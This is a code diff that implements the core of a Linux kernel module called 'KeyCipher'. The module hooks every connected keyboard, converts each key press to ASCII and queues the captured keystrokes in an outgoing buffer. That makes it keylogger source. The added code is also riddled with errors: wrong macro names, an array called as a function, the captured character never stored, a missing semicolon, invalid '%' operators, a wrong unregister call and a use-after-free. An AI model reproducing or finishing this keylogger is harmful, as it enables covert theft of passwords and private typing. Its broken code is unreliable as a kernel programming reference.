@@ -23,6 +23,28 @@
  *   6. keycipher_exit() calls input_intercept_exit() to unregister cleanly
  */
 
+extern struct fifo_buffer outgoing_fifo;
+
+//Linux Keycode to ASCII value
+static const char keycode_to_ascii[256] = {
+    [KEY_A]='a',[KEY_B]='b',[KEY_C]='c',[KEY_D]='d',
+    [KEY_E]='e',[KEY_F]='f',[KEY_G]='g',[KEY_H]='h',
+    [KEY_I]='i',[KEY_J]='j',[KEY_K]='k',[KEY_L]='l',
+    [KEY_M]='m',[KEY_N]='n',[KEY_O]='o',[KEY_P]='p',
+    [KEY_Q]='q',[KEY_R]='r',[KEY_S]='s',[KEY_T]='t',
+    [KEY_U]='u',[KEY_V]='v',[KEY_W]='w',[KEY_X]='x',
+    [KEY_Y]='y',[KEY_Z]='z',
+    [KEY_0]='0',[KEY_1]='1',[KEY_2]='2',[KEY_3]='3',
+    [KEY_4]='4',[KEY_5]='5',[KEY_6]='6',[KEY_7]='7',
+    [KEY_8]='8',[KEY_9]='9',
+    [KEY_SPACE]=' ',[KEY_ENTER]='\n',[KEY_DOT]='.',
+    [KEY_COMMA]=',',[KEY_MINUS]='-',
+};
+
+struct keycipher_message {
+    char data[MSG_MAX_LEN];
+    int  len;
+};
 /*
  * input_event_handler - callback fired by kernel for every input event
  * on any connected keyboard (laptop built-in, USB, or otherwise)
@@ -44,7 +66,23 @@
 static void input_event_handler(struct input_handle *handle, unsigned int type,
                                  unsigned int code, int value)
 {
-    /* TODO: implement keystroke capture and push to outgoing FIFO */
+    struct keycipher_message msg;
+    char ch;
+
+    if (type != EV_KEY) return;
+    if (value != 1) return; //Only captures press
+
+    if (code >= ASCII_SIZE(keycode_to_ascii)) return;
+    ch = keycode_to_ascii(code);
+    if (ch == 0) return;
+
+    memset(&msg, 0, sizeof(msg));
+    msg.data = 0;
+    msg.len = 1;
+
+    fifo_write(&outgoing_fifo, &msg);
+
+    printK(KERN DEBUG "KeyCipher: captured key %c\n", ch);
 }
 
 /*
@@ -65,7 +103,31 @@ static void input_event_handler(struct input_handle *handle, unsigned int type,
 static int input_connect(struct input_handler *handler, struct input_dev *dev,
                           const struct input_device_id *id)
 {
-    /* TODO: implement device connection */
+    struct input_handle *handle = kzalloc(sizeof(&handle), GFP_KERNEL);
+    if (!handle) {
+        return -ENOMEM;
+    }
+    int ret;
+
+    handle->private = NULL;
+    handle->dev = dev;
+    handle->handler = handler;
+    handle->name = "keycipher";
+
+    ret = input_register_handle(handle);
+    if (ret) {
+        kfree(handle);
+        return ret;
+    }
+
+    ret = input_open_device(handle)
+    if (ret) {
+        input_unregister_handle(handle);
+        kfree(handle);
+        return ret;
+    }
+
+    printk(KERN_INFO "KeyCipher: Device connected - %s\n", dev->name);
     return 0;
 }
 
@@ -80,7 +142,11 @@ static int input_connect(struct input_handler *handler, struct input_dev *dev,
  */
 static void input_disconnect(struct input_handle *handle)
 {
-    /* TODO: implement device disconnection */
+    input_close_device(handle);
+    input_unregister_device(handle);
+    kfree(handle);
+    printk(KERN_INFO "KeyCipher: Device disconnected - %s\n", handle->dev->name);
+
 }
 
 /*
@@ -132,7 +198,14 @@ static struct input_handler keycipher_input_handler = {
  */
 int input_intercept_init(void)
 {
-    /* TODO: implement registration */
+    int ret;
+
+    ret = input_register_handler(%keycipher_input_handler);
+    if (ret < 0) {
+        printk(KERN_ERR "KeyCipher: failed to register input handler.\n Error code: %d\n", ret);
+        return ret;
+    }
+    printk(KERN_INFO "KeyCipher: input handler registered\n");
     return 0;
 }
 
@@ -147,5 +220,7 @@ int input_intercept_init(void)
  */
 void input_intercept_exit(void)
 {
-    /* TODO: implement unregistration */
+    input_unregister_handler(%keycipher_imput_handler);
+    printk(KERN_INFO "KeyCipher: Input handler unregistered");
+    
 }
